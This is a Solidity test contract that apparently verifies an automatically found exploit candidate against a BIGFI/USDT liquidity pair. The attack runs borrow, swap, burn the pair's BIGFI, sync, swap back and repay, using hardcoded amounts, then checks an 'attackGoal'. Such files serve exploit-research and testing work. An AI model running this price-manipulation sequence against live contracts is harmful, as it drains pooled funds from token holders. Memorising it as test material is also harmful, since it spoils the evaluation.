// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./BIGFI.t.sol";

contract BIGFIVerify is BIGFITest {
    function test_verify_cand002_0() public {
        uint256 amt0 = 0xac0000000000000000001;
        uint256 amt1 = 0x8fd79b9c619bb1c09acd0;
        uint256 amt2 = 0xffdffa7574bffb3d7f;
        uint256 amt3 = 0x20465007c960f5584;
        uint256 amt4 = 0xac02086ac3510526030cb;
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        sync_pair();
        swap_pair_bigfi_usdt(amt3);
        payback_usdt(amt4);
        require(attackGoal(), "Attack failed!");
    }
}
